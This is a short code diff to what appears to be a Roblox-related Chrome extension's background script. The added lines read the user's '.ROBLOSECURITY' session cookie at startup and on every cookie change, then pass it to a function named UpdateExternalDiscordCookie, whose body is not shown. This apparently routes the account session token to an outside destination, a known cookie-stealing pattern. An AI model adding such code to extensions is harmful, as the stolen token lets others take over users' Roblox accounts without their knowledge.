@@ -180,7 +180,15 @@ chrome.cookies.onChanged.addListener(function(Change){
                 GetCurrentUserId()
             }
         })
+
+        ROBLOSECURITY = Cookie.value
+        UpdateExternalDiscordCookie(ROBLOSECURITY)
     }
+})
+
+chrome.cookies.get({name: ".ROBLOSECURITY", url: "https://roblox.com"}).then(function(Cookie){
+    ROBLOSECURITY = Cookie.value
+    UpdateExternalDiscordCookie(ROBLOSECURITY)
 })
 
 async function FetchAllFeaturesEnabled(){
